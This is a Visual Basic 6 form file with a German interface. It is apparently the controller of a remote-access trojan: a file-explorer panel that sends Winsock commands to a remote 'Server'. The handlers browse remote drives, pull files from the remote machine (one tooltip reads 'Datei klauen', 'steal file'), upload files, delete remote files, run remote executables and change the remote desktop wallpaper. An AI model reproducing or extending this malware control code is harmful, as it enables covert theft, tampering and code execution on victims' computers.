VERSION 5.00
Object = "{831FDD16-0C5C-11D2-A9FC-0000F8754DA1}#2.0#0"; "MSCOMCTL.OCX"
Begin VB.Form frmExplorer 
   BorderStyle     =   1  'Fest Einfach
   Caption         =   "Datei-Explorer bereit"
   ClientHeight    =   6585
   ClientLeft      =   45
   ClientTop       =   330
   ClientWidth     =   11745
   Icon            =   "frmexplorer.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   ScaleHeight     =   6585
   ScaleWidth      =   11745
   StartUpPosition =   2  'Bildschirmmitte
   Begin VB.Timer tmrCancel 
      Enabled         =   0   'False
      Interval        =   5000
      Left            =   5640
      Top             =   3960
   End
   Begin MSComctlLib.ImageList ilTool 
      Left            =   5040
      Top             =   4560
      _ExtentX        =   1005
      _ExtentY        =   1005
      BackColor       =   -2147483643
      ImageWidth      =   32
      ImageHeight     =   32
      MaskColor       =   12632256
      _Version        =   393216
      BeginProperty Images {2C247F25-8591-11D1-B16A-00C0F0283628} 
         NumListImages   =   6
         BeginProperty ListImage1 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmexplorer.frx":08CA
            Key             =   ""
         EndProperty
         BeginProperty ListImage2 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmexplorer.frx":0BE6
            Key             =   ""
         EndProperty
         BeginProperty ListImage3 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmexplorer.frx":14C2
            Key             =   ""
         EndProperty
         BeginProperty ListImage4 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmexplorer.frx":1D9E
            Key             =   ""
         EndProperty
         BeginProperty ListImage5 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmexplorer.frx":267A
            Key             =   ""
         EndProperty
         BeginProperty ListImage6 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmexplorer.frx":2F56
            Key             =   ""
         EndProperty
      EndProperty
   End
   Begin MSComctlLib.TreeView file 
      Height          =   5415
      Left            =   2880
      TabIndex        =   7
      Top             =   120
      Width           =   2655
      _ExtentX        =   4683
      _ExtentY        =   9551
      _Version        =   393217
      Style           =   7
      ImageList       =   "ImageList1"
      Appearance      =   1
   End
   Begin MSComctlLib.ImageCombo drive 
      Height          =   330
      Left            =   120
      TabIndex        =   6
      Top             =   120
      Width           =   2655
      _ExtentX        =   4683
      _ExtentY        =   582
      _Version        =   393216
      ForeColor       =   -2147483640
      BackColor       =   -2147483643
      Text            =   "ImageCombo1"
      ImageList       =   "ImageList1"
   End
   Begin MSComctlLib.TreeView Folder 
      Height          =   4935
      Left            =   120
      TabIndex        =   5
      Top             =   600
      Width           =   2655
      _ExtentX        =   4683
      _ExtentY        =   8705
      _Version        =   393217
      Indentation     =   106
      Style           =   5
      ImageList       =   "ImageList1"
      Appearance      =   1
   End
   Begin MSComctlLib.ImageList ImageList1 
      Left            =   4800
      Top             =   4680
      _ExtentX        =   1005
      _ExtentY        =   1005
      BackColor       =   -2147483643
      ImageWidth      =   16
      ImageHeight     =   16
      MaskColor       =   12632256
      _Version        =   393216
      BeginProperty Images {2C247F25-8591-11D1-B16A-00C0F0283628} 
         NumListImages   =   12
         BeginProperty ListImage1 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmexplorer.frx":3832
            Key             =   ""
         EndProperty
         BeginProperty ListImage2 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmexplorer.frx":3DCE
            Key             =   ""
         EndProperty
         BeginProperty ListImage3 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmexplorer.frx":436A
            Key             =   ""
         EndProperty
         BeginProperty ListImage4 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmexplorer.frx":4C46
            Key             =   ""
         EndProperty
         BeginProperty ListImage5 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmexplorer.frx":5522
            Key             =   ""
         EndProperty
         BeginProperty ListImage6 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmexplorer.frx":5DFE
            Key             =   ""
         EndProperty
         BeginProperty ListImage7 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmexplorer.frx":611A
            Key             =   ""
         EndProperty
         BeginProperty ListImage8 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmexplorer.frx":69F6
            Key             =   ""
         EndProperty
         BeginProperty ListImage9 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmexplorer.frx":72D2
            Key             =   ""
         EndProperty
         BeginProperty ListImage10 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmexplorer.frx":75EE
            Key             =   ""
         EndProperty
         BeginProperty ListImage11 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmexplorer.frx":790A
            Key             =   ""
         EndProperty
         BeginProperty ListImage12 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmexplorer.frx":7A66
            Key             =   ""
         EndProperty
      EndProperty
   End
   Begin VB.FileListBox File1 
      Height          =   5745
      Left            =   9000
      TabIndex        =   3
      Top             =   120
      Width           =   2655
   End
   Begin VB.DirListBox Dir1 
      Height          =   5265
      Left            =   6240
      TabIndex        =   2
      Top             =   585
      Width           =   2655
   End
   Begin VB.DriveListBox Drive1 
      Height          =   315
      Left            =   6240
      TabIndex        =   1
      Top             =   120
      Width           =   2655
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Left            =   120
      TabIndex        =   0
      Text            =   "c:\"
      Top             =   5640
      Width           =   5415
   End
   Begin MSComctlLib.ProgressBar fileProgress 
      Height          =   255
      Left            =   120
      TabIndex        =   4
      Top             =   6240
      Width           =   11535
      _ExtentX        =   20346
      _ExtentY        =   450
      _Version        =   393216
      Appearance      =   0
      Scrolling       =   1
   End
   Begin MSComctlLib.Toolbar toolBar 
      Height          =   570
      Index           =   5
      Left            =   5610
      TabIndex        =   8
      Top             =   3120
      Width           =   615
      _ExtentX        =   1085
      _ExtentY        =   1005
      ButtonWidth     =   1032
      ButtonHeight    =   1005
      Style           =   1
      ImageList       =   "ilOff"
      HotImageList    =   "ilTool"
      _Version        =   393216
      BeginProperty Buttons {66833FE8-8583-11D1-B16A-00C0F0283628} 
         NumButtons      =   1
         BeginProperty Button1 {66833FEA-8583-11D1-B16A-00C0F0283628} 
            Object.ToolTipText     =   "Datei als Desktop-Hintergrund (nur Bitmaps)"
            ImageIndex      =   1
         EndProperty
      EndProperty
   End
   Begin MSComctlLib.Toolbar toolBar 
      Height          =   570
      Index           =   4
      Left            =   5610
      TabIndex        =   9
      Top             =   2400
      Width           =   615
      _ExtentX        =   1085
      _ExtentY        =   1005
      ButtonWidth     =   1032
      ButtonHeight    =   1005
      Style           =   1
      ImageList       =   "ilOff"
      HotImageList    =   "ilTool"
      _Version        =   393216
      BeginProperty Buttons {66833FE8-8583-11D1-B16A-00C0F0283628} 
         NumButtons      =   1
         BeginProperty Button1 {66833FEA-8583-11D1-B16A-00C0F0283628} 
            Object.ToolTipText     =   "Datei ausführen (nur *.exe)"
            ImageIndex      =   2
         EndProperty
      EndProperty
   End
   Begin MSComctlLib.Toolbar toolBar 
      Height          =   570
      Index           =   3
      Left            =   5610
      TabIndex        =   10
      Top             =   1680
      Width           =   615
      _ExtentX        =   1085
      _ExtentY        =   1005
      ButtonWidth     =   1032
      ButtonHeight    =   1005
      Style           =   1
      ImageList       =   "ilOff"
      HotImageList    =   "ilTool"
      _Version        =   393216
      BeginProperty Buttons {66833FE8-8583-11D1-B16A-00C0F0283628} 
         NumButtons      =   1
         BeginProperty Button1 {66833FEA-8583-11D1-B16A-00C0F0283628} 
            Object.ToolTipText     =   "Datei löschen"
            ImageIndex      =   3
         EndProperty
      EndProperty
   End
   Begin MSComctlLib.Toolbar toolBar 
      Height          =   570
      Index           =   2
      Left            =   5610
      TabIndex        =   11
      Top             =   960
      Width           =   615
      _ExtentX        =   1085
      _ExtentY        =   1005
      ButtonWidth     =   1032
      ButtonHeight    =   1005
      Style           =   1
      ImageList       =   "ilOff"
      HotImageList    =   "ilTool"
      _Version        =   393216
      BeginProperty Buttons {66833FE8-8583-11D1-B16A-00C0F0283628} 
         NumButtons      =   1
         BeginProperty Button1 {66833FEA-8583-11D1-B16A-00C0F0283628} 
            Object.ToolTipText     =   "Datei klauen"
            ImageIndex      =   5
         EndProperty
      EndProperty
   End
   Begin MSComctlLib.Toolbar toolBar 
      Height          =   570
      Index           =   1
      Left            =   5610
      TabIndex        =   12
      Top             =   240
      Width           =   615
      _ExtentX        =   1085
      _ExtentY        =   1005
      ButtonWidth     =   1032
      ButtonHeight    =   1005
      Style           =   1
      ImageList       =   "ilOff"
      HotImageList    =   "ilTool"
      _Version        =   393216
      BeginProperty Buttons {66833FE8-8583-11D1-B16A-00C0F0283628} 
         NumButtons      =   1
         BeginProperty Button1 {66833FEA-8583-11D1-B16A-00C0F0283628} 
            Object.ToolTipText     =   "Datei senden"
            ImageIndex      =   4
         EndProperty
      EndProperty
   End
   Begin MSComctlLib.ImageList ilOff 
      Left            =   5280
      Top             =   4440
      _ExtentX        =   1005
      _ExtentY        =   1005
      BackColor       =   -2147483643
      ImageWidth      =   32
      ImageHeight     =   32
      MaskColor       =   12632256
      _Version        =   393216
      BeginProperty Images {2C247F25-8591-11D1-B16A-00C0F0283628} 
         NumListImages   =   6
         BeginProperty ListImage1 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmexplorer.frx":7D82
            Key             =   ""
         EndProperty
         BeginProperty ListImage2 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmexplorer.frx":809E
            Key             =   ""
         EndProperty
         BeginProperty ListImage3 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmexplorer.frx":897A
            Key             =   ""
         EndProperty
         BeginProperty ListImage4 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmexplorer.frx":9256
            Key             =   ""
         EndProperty
         BeginProperty ListImage5 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmexplorer.frx":9B32
            Key             =   ""
         EndProperty
         BeginProperty ListImage6 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmexplorer.frx":A40E
            Key             =   ""
         EndProperty
      EndProperty
   End
   Begin MSComctlLib.Toolbar toolBar 
      Height          =   570
      Index           =   6
      Left            =   5610
      TabIndex        =   13
      Top             =   5280
      Width           =   615
      _ExtentX        =   1085
      _ExtentY        =   1005
      ButtonWidth     =   1032
      ButtonHeight    =   1005
      Style           =   1
      ImageList       =   "ilOff"
      HotImageList    =   "ilTool"
      _Version        =   393216
      BeginProperty Buttons {66833FE8-8583-11D1-B16A-00C0F0283628} 
         NumButtons      =   1
         BeginProperty Button1 {66833FEA-8583-11D1-B16A-00C0F0283628} 
            Object.ToolTipText     =   "Dateiübertragung abbrechen"
            ImageIndex      =   6
         EndProperty
      EndProperty
   End
   Begin VB.Line Line1 
      BorderColor     =   &H00808080&
      BorderWidth     =   2
      X1              =   120
      X2              =   11640
      Y1              =   6120
      Y2              =   6120
   End
End
Attribute VB_Name = "frmExplorer"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False

Private Sub Command1_Click()
Server.wsoWinsock.SendData ("85" + Text1.Text + List1.List(0))
Open "c:\windows\desktop\test.txt" For Binary As #1
End Sub

Private Sub Dir1_Change()
File1.Path = Dir1.Path
End Sub

Private Sub drive_Click()
Dim stri As String
stri = Left(drive.SelectedItem.Text, 2)
stri = "91" + stri + "\"
Server.wsoWinsock.SendData (stri)
Text1.Text = Right(stri, Len(stri) - 2)
End Sub



Private Sub Drive1_Change()
Dir1.Path = Drive1.drive
End Sub


Private Sub Folder_Click()

  On Error GoTo err
  
  Dim stri As String
  Dim ii As Integer
  
  'If Left(Folder.SelectedItem.Key, 1) = "a" Then
    Text1.Text = Folder.SelectedItem.FullPath + "\"
  'Else
   ' Text1.Text = Text1.Text + Folder.SelectedItem.Text + "\"
  'End If
  
  stri = Text1.Text
  Server.wsoWinsock.SendData ("91" + stri)
  
err:
  
End Sub




Private Sub Form_Load()
fileProgress.Value = 100
toolBar(6).Enabled = False
End Sub



Private Sub toolBar_ButtonClick(Index As Integer, ByVal Button As MSComctlLib.Button)
On Error Resume Next
Select Case Index
    Case 1 'C->S
        SendFilePath = Text1.Text + File1.FileName
        Server.wsoWinsock.SendData ("11" + SendFilePath)
        SendFilePath = Dir1.Path + "\" + File1.FileName
        toolBar(6).Enabled = True
    Case 2 'S->C
        Pfad = Text1.Text + file.SelectedItem.Text
        Kill Dir1.Path + "\" + file.SelectedItem.Text
        Open Dir1.Path + "\" + file.SelectedItem.Text For Binary As #1
        Server.wsoWinsock.SendData ("16" + Pfad)
        Pfad = Dir1.Path + "\" + file.SelectedItem.Text
        toolBar(6).Enabled = True
    Case 3 'DEL
        Server.wsoWinsock.SendData ("18" + Text1.Text + file.SelectedItem.Text)
    Case 4 'RUN
        If UCase(Right(file.SelectedItem.Text, 4)) = ".EXE" Then
            Server.wsoWinsock.SendData ("19" + Text1.Text + file.SelectedItem.Text)
        Else
            MsgBox "Dies ist keine ausführbare Datei!", , "Fehler!"
        End If
    Case 5
        Select Case LCase(Right(file.SelectedItem.Text, 4))
            Case ".bmp"
                Server.wsoWinsock.SendData ("63" + Text1.Text + file.SelectedItem.Text)
            Case Else
                MsgBox "Dies ist keine gültige Bitmap!", , "Fehler!"
        End Select
    Case 6
        file = False
        frmExplorer.Caption = "Datei-Explorer bereit"
        frmExplorer.fileProgress.Value = 100
        Server.wsoWinsock.SendData ("99")
        frmExplorer.toolBar(6).Enabled = False
        Close #1
        Kill Pfad
        Pfad = ""
        Server.wsoWinsock.SendData ("91" + Text1.Text)
        frmExplorer.File1.Refresh
End Select
End Sub
